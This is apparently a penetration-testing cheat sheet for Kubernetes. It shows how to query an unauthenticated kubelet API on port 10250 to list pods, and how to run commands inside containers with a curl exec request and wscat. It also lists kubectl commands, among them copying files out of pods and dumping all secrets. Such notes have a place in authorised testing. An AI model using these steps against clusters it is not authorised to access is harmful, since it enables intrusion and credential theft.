Kubernetes
==========

## API
The Kubernetes API exposes the port `10250`. This API can be used to interact with the Kubernetes engine which basically give us the right to do anything you desire unauthenticated.

To confirm that the host is running Docker you can make a GET requests to `/pods` :

```
https://<host>:<port>/pods

{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"dind-sgz8n","generateName":"dind-","namespace":"default","selfLink":"/api/v1/namespaces/default/pods/dind-sgz8n",`...}],"qosClass":"BestEffort"}}]}
```

With the above information it's possible to send requests to the API to execute commands:
```bash
$ curl --insecure -v -H "W-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -H "Connection: upgrade" -H "Upgrade: SPDY/3.1" -X POST "https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1"
```

In the response, there is a `Location` header to create a WebSocket connection:
```bash
$ wscat -c "https://<host>:<port>/<location_header>" --no-check
```


## Useful commands

#### Start a pod

```bash
kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1
```

#### Attach to an existing pod

```bash
kubectl exec -it k8s-2-test -- /bin/bash
```

#### Connect to an existing connection

```bash
kubectl attach k8s-1-test -c k8s-1-test -i -t
```

#### Copy a file from a pod to the local machine

```bash
kubectl cp default/k8s-1-test:{FILE} ./{FILE_DEST}
```

#### Print services

```bash
kubectl get services (-o wide)
```

#### Print pods
```bash
kubectl get pods -o json
kubectl get pods -o wide
kubectl get pods -o wide | sed -e 's/\s\+/ /g' | cut -f6 -d " "
```

#### Print secrets

```bash
kubectl get secrets -o yaml
```
